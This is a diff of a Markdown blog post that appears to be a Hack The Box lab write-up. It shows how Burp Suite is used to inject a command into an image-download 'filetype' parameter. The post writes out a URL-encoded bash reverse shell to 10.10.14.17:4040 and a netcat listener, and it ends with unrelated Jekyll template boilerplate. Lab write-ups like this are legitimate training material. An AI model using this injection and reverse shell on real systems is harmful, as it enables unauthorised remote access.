@@ -80,22 +80,29 @@ In that step we are using a proxy tool called [**Burpsuite**] and let's start to
 ### Proxy
 So in this panel tell us that we are unable to download any picture from this page, well with the help our proxy we can see what request leave it us:
 
-How we can see the request 
+we can see that the package is processed by the POST method, and under headers we see some parameters of the request to download the image like: `photo`, `filetype` and `dimensions` but in this case we are focus on `filetype` parameter
+
 ![HTB Img](/assets/img//HTB/EASY/request.png)
 
+Send it to repeater tool we are going to change any variable from `filetype` parameter look some effect:
 
 ![HTB Img](/assets/img//HTB/EASY/repeater.png)
 
-verify the response with a **500 code** **[Internal Server Error]** we are going to test if it works to do a [**reverse shell**], on filetype parameter we are put to next to `jpg` adding `;` and write the next reverse shell *(PD: encoded on url because we'll have an error from the syntaxis)* on my case I'll use from *bash* method with **Netcat** listener
+verify the response with a **500 code** **[Internal Server Error]** we are going to test if it works to do a [**reverse shell**], on this parameter we are put to next to `jpg` adding `;` and write the next reverse shell code *(PD: encoded on url because we'll have an error from the syntaxis due for the commas)* on my case I'll use from *bash* method with **Netcat** listener
 
 ```console
 bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.17%2F4040%200%3E%261
-
 ```
-> You can see others methods from this [**web**](https://sentrywhale.com/documentation/reverse-shell) :D.
+> You can see others methods from this [**web**](https://sentrywhale.com/documentation/reverse-shell) fi you want :D.
 {: .prompt-tip }
 
+Now we are lsitening from our terminal with netcat see any response
 
+```console
+nc -lvnp 4040
+
+Listening on [any] 0.0.0.0 4040 ...
+```
 
 Create a new file named `YYYY-MM-DD-TITLE.EXTENSION`{: .filepath} and put it in the `_posts`{: .filepath} of the root directory. Please note that the `EXTENSION`{: .filepath} must be one of `md`{: .filepath} and `markdown`{: .filepath}. If you want to save time of creating files, please consider using the plugin `Jekyll-Compose`(https://github.com/jekyll/jekyll-compose) to accomplish this.
 
